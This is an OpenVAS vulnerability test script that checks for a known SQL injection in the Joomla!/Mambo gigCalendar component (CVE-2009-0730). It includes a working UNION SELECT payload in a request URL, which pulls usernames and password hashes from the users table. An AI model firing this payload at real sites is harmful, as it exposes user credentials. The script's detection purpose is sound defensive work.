###############################################################################
# OpenVAS Vulnerability Test
# $Id: joomla_mambo_gigcalendar_component_sql_injection.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Joomla! and Mambo gigCalendar Component SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The gigCalendar component for Joomla! and Mambo is prone to an
  SQL-injection vulnerability because it fails to sufficiently
  sanitize user-supplied data before using it in an SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.
  
  gigCalendar 1.0 is vulnerable; other versions may also be affected. 

  See http://www.securityfocus.com/bid/33863/ and http://joomlacode.org/gf/project/gigcalendar/
  for further informations.";

tag_impact = "Successful exploitation will allow the attacker to view username and
  password of a registered user.";
tag_solution = "Update to newer version if available at http://joomlacode.org/gf/project/gigcalendar/, remove the
  gigCalendar component or set 'magic_quotes_gpc = On' in php.ini.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100004");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-02-26 04:52:45 +0100 (Thu, 26 Feb 2009)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-0730");
 script_bugtraq_id(33863);
 script_name("Joomla! and Mambo gigCalendar Component SQL Injection Vulnerability");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/joomla", "/cms", cgi_dirs( port:port ) ) ) { 

  if( dir == "/" ) dir = "";
  url = string(dir, "/index.php?option=com_gigcal&task=details&gigcal_bands_id=-1%27UNION%20ALL%20SELECT%201,2,3,4,5,concat(%27username:%20%27,username),concat(%27password:%20%27,%20password),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20jos_users%23");

  if(http_vuln_check(port:port, url:url,pattern:"password:.[a-f0-9]{32}:")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
